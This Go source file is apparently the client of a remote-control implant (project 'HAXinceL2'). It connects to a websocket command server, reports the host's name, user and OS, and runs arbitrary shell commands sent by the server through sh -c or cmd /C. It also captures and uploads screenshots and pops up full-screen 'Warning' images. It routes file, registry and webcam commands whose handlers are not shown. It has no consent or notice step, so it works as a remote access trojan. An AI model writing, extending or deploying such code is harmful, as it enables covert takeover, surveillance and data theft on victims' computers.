package internal

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"log"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/E2klime/HAXinceL2/internal/protocol"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
)

type Client struct {
	ID        string
	ServerURL string
	conn      *websocket.Conn
	hostname  string
	username  string
}

func NewClient(serverURL string) (*Client, error) {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	return &Client{
		ID:        uuid.New().String(),
		ServerURL: serverURL,
		hostname:  hostname,
		username:  username,
	}, nil
}

func (c *Client) Connect() error {
	u, err := url.Parse(c.ServerURL)
	if err != nil {
		return fmt.Errorf("invalid server URL: %w", err)
	}

	conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		return fmt.Errorf("failed to connect: %w", err)
	}

	c.conn = conn

	authPayload := protocol.AuthPayload{
		ClientID: c.ID,
		Hostname: c.hostname,
		Username: c.username,
		OS:       runtime.GOOS,
	}

	payloadBytes, _ := json.Marshal(authPayload)

	authMsg := protocol.Message{
		Type:      protocol.TypeAuth,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	if err := conn.WriteJSON(authMsg); err != nil {
		return fmt.Errorf("failed to send auth: %w", err)
	}

	log.Printf("Connected to server: %s (ID: %s)", c.ServerURL, c.ID)

	return nil
}

func (c *Client) Run() error {
	go c.heartbeat()

	go c.monitorVPN()

	for {
		var msg protocol.Message
		err := c.conn.ReadJSON(&msg)
		if err != nil {
			log.Printf("Connection error: %v", err)
			return err
		}

		go c.handleMessage(&msg)
	}
}

func (c *Client) heartbeat() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		authPayload := protocol.AuthPayload{
			ClientID: c.ID,
			Hostname: c.hostname,
			Username: c.username,
			OS:       runtime.GOOS,
		}

		payloadBytes, _ := json.Marshal(authPayload)

		msg := protocol.Message{
			Type:      protocol.TypeHeartbeat,
			Payload:   payloadBytes,
			Timestamp: time.Now().Unix(),
		}

		if err := c.conn.WriteJSON(msg); err != nil {
			log.Printf("Failed to send heartbeat: %v", err)
			return
		}
	}
}

func (c *Client) handleMessage(msg *protocol.Message) {
	switch msg.Type {
	case protocol.TypeCommand:
		c.handleCommand(msg)
	case protocol.TypeScreenshot:
		c.handleScreenshot(msg)
	case protocol.TypeWebcam:
		c.handleWebcam(msg)
	case protocol.TypeShowImage:
		c.handleShowImage(msg)
	case protocol.TypeFileRead:
		c.handleFileRead(msg)
	case protocol.TypeFileWrite:
		c.handleFileWrite(msg)
	case protocol.TypeFileDelete:
		c.handleFileDelete(msg)
	case protocol.TypeFileList:
		c.handleFileList(msg)
	case protocol.TypeFileDownload:
		c.handleFileDownload(msg)
	case protocol.TypeRegRead:
		c.handleRegRead(msg)
	case protocol.TypeRegWrite:
		c.handleRegWrite(msg)
	case protocol.TypeRegDelete:
		c.handleRegDelete(msg)
	case protocol.TypeRegList:
		c.handleRegList(msg)
	default:
		log.Printf("Unknown message type: %s", msg.Type)
	}
}

func (c *Client) handleCommand(msg *protocol.Message) {
	var payload protocol.CommandPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		c.sendError("Failed to parse command", err)
		return
	}

	log.Printf("Executing command: %s %v", payload.Command, payload.Args)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		args := append([]string{"/C", payload.Command}, payload.Args...)
		cmd = exec.Command("cmd", args...)
	} else {
		cmdStr := payload.Command
		if len(payload.Args) > 0 {
			cmdStr += " " + strings.Join(payload.Args, " ")
		}
		cmd = exec.Command("sh", "-c", cmdStr)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		c.sendResponse(false, string(output), err.Error())
		return
	}

	c.sendResponse(true, string(output), "")
}

func (c *Client) handleScreenshot(msg *protocol.Message) {
	log.Println("Taking screenshot...")

	n := screenshot.NumActiveDisplays()
	if n == 0 {
		c.sendError("No active displays", nil)
		return
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		c.sendError("Failed to capture screenshot", err)
		return
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		c.sendError("Failed to encode screenshot", err)
		return
	}

	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
	c.sendResponse(true, encoded, "")

	log.Printf("Screenshot sent (%d bytes)", len(encoded))
}

func (c *Client) handleWebcam(msg *protocol.Message) {
	var payload protocol.WebcamPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		c.sendError("Failed to parse webcam payload", err)
		return
	}

	log.Printf("Starting webcam stream for %d seconds...", payload.Duration)

	c.sendResponse(true, "Webcam streaming not implemented yet", "")
}

func (c *Client) handleShowImage(msg *protocol.Message) {
	var payload protocol.ShowImagePayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		c.sendError("Failed to parse show image payload", err)
		return
	}

	log.Printf("Showing image: %s", payload.ImageURL)

	html := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
	<style>
		body { margin: 0; padding: 0; overflow: hidden; background: black; }
		img { width: 100vw; height: 100vh; object-fit: contain; }
	</style>
</head>
<body>
	<img src="%s" alt="Warning">
	<script>
		document.addEventListener('keydown', () => window.close());
		%s
	</script>
</body>
</html>`, payload.ImageURL, func() string {
		if payload.Duration > 0 {
			return fmt.Sprintf("setTimeout(() => window.close(), %d000);", payload.Duration)
		}
		return ""
	}())

	tmpFile := "/tmp/show_image.html"
	if runtime.GOOS == "windows" {
		tmpFile = os.Getenv("TEMP") + "\\show_image.html"
	}

	if err := os.WriteFile(tmpFile, []byte(html), 0644); err != nil {
		c.sendError("Failed to create HTML file", err)
		return
	}

	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/C", "start", "", tmpFile)
	case "darwin":
		cmd = exec.Command("open", "-a", "Google Chrome", "--args", "--start-fullscreen", tmpFile)
	default:
		cmd = exec.Command("xdg-open", tmpFile)
	}

	if err := cmd.Start(); err != nil {
		c.sendError("Failed to open image", err)
		return
	}

	c.sendResponse(true, "Image displayed", "")
}

func (c *Client) sendResponse(success bool, data, errMsg string) {
	payload := protocol.ResponsePayload{
		Success: success,
		Data:    data,
		Error:   errMsg,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := protocol.Message{
		Type:      protocol.TypeResponse,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	if err := c.conn.WriteJSON(msg); err != nil {
		log.Printf("Failed to send response: %v", err)
	}
}

func (c *Client) sendError(message string, err error) {
	errMsg := message
	if err != nil {
		errMsg = fmt.Sprintf("%s: %v", message, err)
	}

	log.Printf("Error: %s", errMsg)

	payload := protocol.ErrorPayload{
		Code:    "ERROR",
		Message: errMsg,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := protocol.Message{
		Type:      protocol.TypeError,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	c.conn.WriteJSON(msg)
}

func (c *Client) monitorVPN() {
}
